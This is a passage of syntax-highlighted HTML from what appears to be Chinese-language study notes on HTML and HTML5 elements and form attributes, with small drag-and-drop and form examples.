class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;type/css&quot;</span> /&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">		&gt; 设置图标：<span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;java.ico&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;shortcut icon&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/x-icon&quot;</span> /&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"> - <span class="tag">&lt;<span class="name">base</span>&gt;</span>空元素，指定页面中所有连接的基准路径</span></span></span><br><span class="line">		&gt; href:指定所链接的基准路径</span><br><span class="line">		&gt; target</span><br><span class="line"><span class="javascript">		举例应用:<span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">				<span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;index.php&quot;</span>&gt;</span>base<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span></span><br><span class="line"> - draggable属性：（1）如果希望把某个元素可拖动，只需要把该元素的**draggable**属性</span><br><span class="line"><span class="javascript">   设置为<span class="literal">true</span>即可，只是简单的拖动，并没有携带数据，因此看不到拖动的效果。</span></span><br><span class="line">  （2）为了让拖动能携带数据，应该为被拖动的元素的**ondragstart**事件指定监听器,</span><br><span class="line"><span class="javascript">   在该监听器中让拖动操作可携带数据。（<span class="number">3</span>）为了让<span class="built_in">document</span>可以接收放，应该为<span class="built_in">document</span></span></span><br><span class="line"><span class="javascript">   的ondragover事件指定监听器，在监听器中取消<span class="built_in">document</span>对拖动事件的默认行为</span></span><br><span class="line">   （默认不接受放）。（4）不同浏览器对拖放操作的默认动作是不同的，如果希望取消</span><br><span class="line"><span class="javascript">   拖放操作的默认动作，可以对<span class="built_in">document</span>的ondrop事件绑定监听器。示例如下：</span></span><br><span class="line"><span class="javascript">		&gt; <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;source&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:80px;height:80px;</span></span></span></span></span><br><span class="line">				border:1px;solid black;</span><br><span class="line">				background-color:#bbb;&quot;</span><br><span class="line"><span class="javascript">				draggable=<span class="string">&quot;true&quot;</span>&gt;可拖动的div&lt;/div&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">			<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">				<span class="keyword">var</span> source=<span class="built_in">document</span>.getElementById(<span class="string">&quot;source&quot;</span>);</span></span><br><span class="line"><span class="javascript">				source.ondragstart=<span class="function"><span class="keyword">function</span>(<span class="params">evt</span>)</span></span></span><br><span class="line">				&#123;</span><br><span class="line"><span class="javascript">					evt.dataTransfer.setData(<span class="string">&quot;text&quot;</span>,<span class="string">&quot;可拖动的div&quot;</span>);</span></span><br><span class="line">				&#125;</span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.ondragover=<span class="function"><span class="keyword">function</span>(<span class="params">evt</span>)</span></span></span><br><span class="line">				&#123;</span><br><span class="line"><span class="javascript">					<span class="comment">//取消时间的默认行为</span></span></span><br><span class="line"><span class="javascript">					<span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">				&#125;</span><br><span class="line"><span class="javascript">				<span class="built_in">document</span>.ondrop=<span class="function"><span class="keyword">function</span>(<span class="params">evt</span>)</span></span></span><br><span class="line">				&#123;</span><br><span class="line"><span class="javascript">					source.style.position=<span class="string">&quot;absolute&quot;</span>;</span></span><br><span class="line"><span class="javascript">					source.style.left=evt.pageX+<span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">					source.style.top=evt.pageY+<span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">					<span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">				&#125;</span><br><span class="line">			<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> - <span class="tag">&lt;<span class="name">form</span>&gt;</span>用于生成表单，该元素不会生成可视化部分,默认使用**get**方式</span><br><span class="line">		&gt; action：指定当提交表单时，表单被提交到哪个地址，可以是相对路径，也可以是绝对路径，</span><br><span class="line">		 必填</span><br><span class="line">		&gt; method：指定提交表单时发送何种类型的请求，属性值get和post，通常建议发送post请求，</span><br><span class="line">		 必填</span><br><span class="line">		&gt; name:指定表单唯一名称，建议与id保持一致</span><br><span class="line">		&gt; target</span><br><span class="line">		&gt; enctype:指定对表单内容进行编码所使用的字符集</span><br><span class="line"> - <span class="tag">&lt;<span class="name">input</span>&gt;</span>空元素，有value属性</span><br><span class="line">		&gt; 单行文本框：type=&quot;text&quot;</span><br><span class="line">		&gt; 密码框：type=&quot;password&quot;</span><br><span class="line">		&gt; 隐藏框：type=&quot;hidden&quot;</span><br><span class="line">		&gt; 单选框：type=&quot;radio&quot;</span><br><span class="line">		&gt; 复选框：type=&quot;checkbox&quot;</span><br><span class="line">		&gt; 图像域：type=&quot;image&quot;时，<span class="tag">&lt;<span class="name">input</span>&gt;</span>可以指定width和height属性</span><br><span class="line">		&gt; 文件上传域：type=&quot;file&quot;</span><br><span class="line">		&gt; 提交：type=&quot;submit&quot;</span><br><span class="line">		&gt; 重设：type=&quot;resrt&quot;</span><br><span class="line">		&gt; 无动作：type=&quot;button</span><br><span class="line"></span><br><span class="line">		&gt; checked:支持Boolean值，设置单选框、复选框初始状态是否处于选中状态</span><br><span class="line">		&gt; disabled:支持Boolean值，表示该元素被禁用</span><br><span class="line">		&gt; maxlength：是一个数字，表示文本框中所允许输入的最大字数</span><br><span class="line">		&gt; readonly：支持Boolean值，指定该文本框的内容不容许用户修改</span><br><span class="line">		&gt; size：属性值是一个数字，指定该元素的宽度，type=hidden时该属性没有意义</span><br><span class="line">		&gt; src:指定图像域所显示图像的URL</span><br><span class="line">		&gt; width：指定图像域所显示图像的宽度</span><br><span class="line">		&gt; height：指定图像域所显示图像的高度</span><br><span class="line"> - <span class="tag">&lt;<span class="name">label</span>&gt;</span>用于在表单元素中定义标签，让标签和表单控件关联起来有两种方式：</span><br><span class="line">		&gt; 隐式使用for属性：指定<span class="tag">&lt;<span class="name">label</span>&gt;</span>元素的for属性值为所关联表单控件的id属性值，例:</span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;id&quot;</span>&gt;</span>单行文本框：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;id&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line">		&gt; 显示关联：将普通文本，表单控件一起放在<span class="tag">&lt;<span class="name">label</span>&gt;</span>元素内，例：</span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span>&gt;</span>密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"> - <span class="tag">&lt;<span class="name">button</span>&gt;</span>定义一个按钮，可以包含文本和图片</span><br><span class="line">		&gt; disabled</span><br><span class="line">		&gt; name</span><br><span class="line">		&gt; type:属性值：submit reset button</span><br><span class="line">		&gt; value:指定按钮的初始值</span><br><span class="line"> - <span class="tag">&lt;<span class="name">select</span>&gt;</span>创建列表框和下拉菜单，该元素必须和<span class="tag">&lt;<span class="name">option</span>&gt;</span>组合使用，每个<span class="tag">&lt;<span class="name">option</span>&gt;</span>元素</span><br><span class="line">   代表一个列表项或菜单项，<span class="tag">&lt;<span class="name">select</span>&gt;</span>只能包含<span class="tag">&lt;<span class="name">option</span>&gt;</span>或者<span class="tag">&lt;<span class="name">optgroup</span>&gt;</span></span><br><span class="line">		&gt; disabled:禁止使用该列表项和下拉菜单，属性值只能是disabled或者省略</span><br><span class="line">		&gt; multiple：支持Boolean值，一旦设置多选，<span class="tag">&lt;<span class="name">select</span>&gt;</span>自动生成列表框</span><br><span class="line">		&gt; size：指定列表框内同时显示多少个列表项，一旦设置该属性，</span><br><span class="line">		  <span class="tag">&lt;<span class="name">select</span>&gt;</span>自动生成列表框</span><br><span class="line"> - <span class="tag">&lt;<span class="name">option</span>&gt;</span>定义列表框选项或菜单项</span><br><span class="line">		&gt; disabled:禁止使用，属性值只能是disabled或者省略</span><br><span class="line">		&gt; selected：列表项初始状态是否处于被选中状态，属性值只能是selected</span><br><span class="line">		&gt; value：选项对应的请求参数</span><br><span class="line"> - <span class="tag">&lt;<span class="name">optgroup</span>&gt;</span>定义列表项或菜单项组，只能包含<span class="tag">&lt;<span class="name">option</span>&gt;</span>元素</span><br><span class="line">		&gt; label：指定选项组的标签，必填，例:</span><br><span class="line">			<span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;其他图书&quot;</span>&gt;</span>&lt;/outgroup</span><br><span class="line">		&gt; disabled</span><br><span class="line"> -<span class="tag">&lt;<span class="name">textarea</span>&gt;</span>生成多行文本域</span><br><span class="line">		&gt; cols:指定文本域的宽度，必填</span><br><span class="line">		&gt; rows指定文本域的高度，必填</span><br><span class="line">		&gt; disabled</span><br><span class="line">		&gt; readonly：只读，属性值只能是readonly</span><br><span class="line">		&gt; maxlength：设置最多可输入的字符数</span><br><span class="line">		&gt; wrap：指定多换文本域是否添加换行符，soft和hard两个属性值，设为hard时，</span><br><span class="line">		  必须指定cols属性，字符超过cols时，自动换行，提交时在换行出自动添加换行符</span><br><span class="line">				 <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">				下面是简单下拉菜单：<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;skills&quot;</span> <span class="attr">name</span>=<span class="string">&quot;skills&quot;</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;java&quot;</span>&gt;</span>java语言<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;c&quot;</span>&gt;</span>C语言<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;ruby&quot;</span>&gt;</span>ruby语言<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				下面是允许多选的列表框：<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;books&quot;</span> <span class="attr">name</span>=<span class="string">&quot;books&quot;</span></span></span><br><span class="line"><span class="tag">					<span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">size</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;java&quot;</span>&gt;</span>疯狂Java讲义<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;android&quot;</span>&gt;</span>疯狂安卓讲义<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;ee&quot;</span>&gt;</span>ee实战<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">				下面是允许多选的列表框：<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;leegang&quot;</span> <span class="attr">name</span>=<span class="string">&quot;leegang&quot;</span></span></span><br><span class="line"><span class="tag">					<span class="attr">multiple</span> <span class="attr">size</span>=<span class="string">&quot;6&quot;</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">optgroup</span>	<span class="attr">label</span>=<span class="string">&quot;疯狂JAVA图书&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;java&quot;</span>&gt;</span>疯狂Java讲义<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;android&quot;</span>&gt;</span>疯狂安卓讲义<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;ee&quot;</span>&gt;</span>ee实战<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;其他图书&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;struts&quot;</span>&gt;</span>struts 指南<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;ror&quot;</span>&gt;</span>ror开发<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				简单多行文本域：<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;txt1&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;20&quot;</span> <span class="attr">row</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				zhiduode:<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;txt2&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;28&quot;</span> <span class="attr">row</span>=<span class="string">&quot;4&quot;</span> <span class="attr">readonly</span>&gt;</span>fejifjeofjdkl</span><br><span class="line">					djlsdkfjeoifdlka<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> - <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>用于对表单内表单元素进行分组，一组的有特殊边界效果</span><br><span class="line">		&gt; name</span><br><span class="line">		&gt; form属性值必须是一个有效的<span class="tag">&lt;<span class="name">form</span>&gt;</span>元素的id，用于指定<span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>元素属于哪个表单</span><br><span class="line">		&gt; disabled</span><br><span class="line"> - <span class="tag">&lt;<span class="name">legend</span>&gt;</span>放在<span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>元素内，为<span class="tag">&lt;<span class="name">fieldset</span>&gt;</span>元素设置标题，例：</span><br><span class="line">           <span class="tag">&lt;<span class="name">fieldset</span> <span class="attr">name</span>=<span class="string">&quot;name7&quot;</span>&gt;</span></span><br><span class="line">		        <span class="tag">&lt;<span class="name">legend</span>&gt;</span>简答题<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">		     	<span class="tag">&lt;<span class="name">ol</span> <span class="attr">style</span>=<span class="string">&quot;1&quot;</span> <span class="attr">start</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>你的梦想是什么？：<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>&lt;/b<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;txt1&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;20&quot;</span> <span class="attr">row</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">i</span>&gt;</span>以《我最敬佩的人》写一篇作文：<span class="tag">&lt;/<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span>&lt;/b<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">					<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;txt2&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;20&quot;</span> <span class="attr">row</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">			    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"> -form属性：通过为表单控件指定form属性，可以让表单控件在<span class="tag">&lt;<span class="name">form</span>&gt;</span>元素之外，从而提高灵活性</span><br><span class="line"> 	form的属性值为<span class="tag">&lt;<span class="name">form</span>&gt;</span>元素的id值</span><br><span class="line"> - formaction属性：指定用于提交的不同的URL，例：</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> <span class="attr">formaction</span>=<span class="string">&quot;logon.html&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;开始游戏&quot;</span> <span class="attr">formaction</span>=<span class="string">&quot;playgame.html&quot;</span>/&gt;</span></span><br><span class="line">		这两个不同按钮会将网页提交到不同的URL</span><br><span class="line"> - forxxx属性，自行百度</span><br><span class="line"> - autofocus属性：自动获得焦点，打开控件时只能有一个控件或得焦点，</span><br><span class="line"> 	所以整个页面上只能有一个表单元元素设置次属性，例：</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">autofocus</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span> /&gt;</span></span><br><span class="line"> - placeholder属性：产生提示信息，例：</span><br><span class="line"> 	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">autofocus</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span> /&gt;</span></span><br><span class="line"> - list属性：文本框与下拉菜单结合的组件，该组件既允许用户输入，也允许用户通过下拉菜单</span><br><span class="line"> 	选择，list属性值应该是一个<span class="tag">&lt;<span class="name">datalist</span>&gt;</span>元素的id，list属性必须和<span class="tag">&lt;<span class="name">datalist</span>&gt;</span>元素一起使用</span><br><span class="line"> 	例：<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;buy&quot;</span>&gt;</span></span><br><span class="line">			请输入图书：<span class="tag">&lt;<span class="name">input</span>  <span class="attr">name</span>=<span class="string">&quot;name1&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">list</span>=<span class="string">&quot;books1&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;购买&quot;</span> /&gt;</span></span><br><span class="line">		      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">datalist</span> <span class="attr">id</span>=<span class="string">&quot;books1&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;java&quot;</span>&gt;</span>疯狂Java讲义<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;android&quot;</span>&gt;</span>疯狂安卓讲义<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;ee&quot;</span>&gt;</span>ee实战<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">datalist</span>&gt;</span></span><br><span class="line">	   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> - autocomplete属性设置表单是否支持自动完成功能，会根据你的输入记录自动进行提示，</span><br><span class="line"> 	属性值on或者off</span><br><span class="line"> - label的control属性：用于在Javascript脚本中访问该<span class="tag">&lt;<span class="name">label</span>&gt;</span>元素所关联的表单元素，例：</span><br><span class="line">		 <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;pro.action&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;on&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;nameLB&quot;</span>&gt;</span>姓名：</span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name2&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重设&quot;</span> </span></span><br><span class="line"><span class="tag">					<span class="attr">onclick</span>=<span class="string">&quot;document.getElementById(&#x27;nameLB&#x27;).control.value=&#x27;crazy&#x27;;&quot;</span>/&gt;</span></span><br><span class="line">		 <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> - labels：自行百度</span><br><span class="line"> - 文本框的selectionDirection属性</span><br><span class="line">		&gt; 正向选取文字时，selectionDirection属性返回forward</span><br><span class="line">		&gt; 反向选取文字时，selectionDirection属性返回backward</span><br><span class="line">		&gt; 没有选取时，返回上一次的值</span><br><span class="line">		&gt; 从未选取时，返回forward</span><br><span class="line">   例：<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;pro.action&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;on&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;nameLb&quot;</span>&gt;</span>姓名：</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name3&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;获取&quot;</span> </span></span><br><span class="line"><span class="tag">			<span class="attr">onclick</span>=<span class="string">&quot;alert(document.getElementById(&#x27;nameLb&#x27;).control.selectionDirection);&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> - 复选框的indeterminate属性：true和false两个属性值，在JS中判断一个复选框的checked属性之前，</span><br><span class="line"> 	需要先判断indeterminate属性是否为false，只有indeterminate属性为false是判断checked状态才有效</span><br><span class="line"> 	例：<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;pro.action&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;on&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;colorLb&quot;</span>&gt;</span>红色：</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;color&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;设置&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">onclick</span>=<span class="string">&quot;document.getElementById(&#x27;colorLb&#x27;).control.indeterminate=true;&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;获取&quot;</span></span></span><br><span class="line"><span class="tag">		<span class="attr">onclick</span>=<span class="string">&quot;alert(document.getElementById(&#x27;colorLb&#x27;).control.indeterminate);&quot;</span>/&gt;</span></span><br><span class="line">	   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> - 功能丰富的input元素</span><br><span class="line"> 	例：<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;do&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">			请选择你喜欢的颜色：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;color&quot;</span> <span class="attr">type</span>=<span class="string">&quot;color&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			请输入您的出生日期：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;date &quot;</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span>/&gt;</span><span class="tag">&lt;<span 